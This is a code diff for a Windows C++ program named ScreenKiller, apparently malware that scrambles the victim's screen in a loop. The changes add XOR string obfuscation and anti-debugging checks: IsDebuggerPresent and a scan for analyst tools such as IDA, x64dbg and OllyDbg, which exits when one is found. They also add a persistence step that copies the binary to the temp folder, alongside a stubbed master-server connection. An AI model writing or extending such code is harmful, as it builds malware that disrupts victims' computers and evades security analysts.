@@ -1,10 +1,11 @@
 #include <windows.h>
+#include <tlhelp32.h>
 #include <iostream>
 #include <thread>
 
 #include "ScreenKiller.hpp"
 
-VOID WINAPI ScrambleWindow(PScreenProps screen_props);
+VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj);
 
 ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) {}
 
@@ -28,9 +29,21 @@ void ScreenKiller::suicide()
 	this->m_alive = false;
 }
 
+std::string ScreenKiller::encrypt_string(std::string input_string)
+{
+	std::string output_string = "";
+
+	for (char const& c : input_string) {
+		output_string += (char)(c ^ XOR_KEY);
+	}
+
+	return output_string;
+}
+
 bool ScreenKiller::deploy_inner()
 {
 	this->connect_to_master_server();
+	this->exit_if_debugged();
 	this->get_persistency();
 
 	HWND hDesktop = NULL;
@@ -42,12 +55,12 @@ bool ScreenKiller::deploy_inner()
 	srand(GetCurrentTime());
 
 	RECT desktop = { 0 };
-
+	
 	GetWindowRect(hDesktop, &(screen_props.rectScreen));
 
 	while (this->m_alive)
 	{
-		ScrambleWindow(&screen_props);
+		ScrambleWindow(&screen_props, this);
 		Sleep(10);
 	}
 
@@ -56,7 +69,14 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	char filename[] = "mystery";
+	char temp_path[MAX_PATH];
+
+	GetTempPathA(MAX_PATH, temp_path);
+
+	strcat_s(temp_path, MAX_PATH, filename);
+
+	return CopyFileA(filename, temp_path, false) != 0;
 }
 
 bool ScreenKiller::connect_to_master_server()
@@ -64,7 +84,56 @@ bool ScreenKiller::connect_to_master_server()
 	return false;
 }
 
-VOID WINAPI ScrambleWindow(PScreenProps screen_props) 
+void ScreenKiller::exit_if_debugged()
+{
+	if (this->is_debugged1() || this->is_debugged2())
+		exit(1337);
+}
+
+bool ScreenKiller::is_debugged1()
+{
+	return IsDebuggerPresent();
+}
+
+bool ScreenKiller::is_debugged2()
+{
+		// detect debugger by process file (for example: ollydbg.exe)
+		const wchar_t* debuggersFilename[6] = {
+			L"cheatengine-x86_64.exe",
+			L"ollydbg.exe",
+			L"ida.exe",
+			L"ida64.exe",
+			L"radare2.exe",
+			L"x64dbg.exe"
+		};
+
+		wchar_t* processName;
+		PROCESSENTRY32W processInformation{ sizeof(PROCESSENTRY32W) };
+		HANDLE processList;
+		
+		processList = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+		processInformation = { sizeof(PROCESSENTRY32W) };
+		if (!(Process32FirstW(processList, &processInformation)))
+			printf("[Warning] It is impossible to check process list.");
+		else
+		{
+			do
+			{
+				for (const wchar_t* debugger : debuggersFilename)
+				{
+					processName = processInformation.szExeFile;
+					if (_wcsicmp(debugger, processName) == 0) {
+						return true;
+					}
+				}
+			} while (Process32NextW(processList, &processInformation));
+		}
+		CloseHandle(processList);
+
+		return false;
+}
+
+VOID WINAPI ScrambleWindow(PScreenProps screen_props, ScreenKiller *obj) 
 {
 	HDC hdcScreen = screen_props->hdcScreen;
 	RECT rectScreen = screen_props->rectScreen;
@@ -81,6 +150,8 @@ VOID WINAPI ScrambleWindow(PScreenProps screen_props)
 
 	while (TRUE)
 	{
+		obj->exit_if_debugged();
+
 		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
 		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
 		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
